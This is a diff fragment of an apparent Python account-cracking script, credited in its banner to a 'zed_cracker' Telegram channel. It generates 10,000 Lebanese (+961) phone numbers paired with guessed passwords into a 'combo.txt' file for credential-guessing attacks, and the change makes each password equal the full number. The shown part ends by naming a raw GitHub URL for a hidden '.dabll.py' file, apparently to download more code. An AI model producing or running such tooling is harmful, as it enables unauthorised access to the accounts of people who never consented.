@@ -39,12 +39,12 @@ logo1=G+'''
      ➣ telegram : https://t.me/zed_cracker_1
  '''+W+'''---------------------------------------------------'''
 print(logo1)
-print(' 3, 70, 71')
+print(' 03, 070, 071')
 so=input("\n saratakay: ")
 for i in range(10000):
     r1=random.randint(100000, 999999)
     sys.stdout=open("combo.txt", "a")
-    print("+961"+str(so)+str(r1)+":"+str(r1))
+    print("+961"+str(so)+str(r1)+":"+str(so)+str(r1))
     sys.stdout.flush()
 import wget
 url="https://raw.githubusercontent.com/zed404sfrr/-/main/.dabll.py"
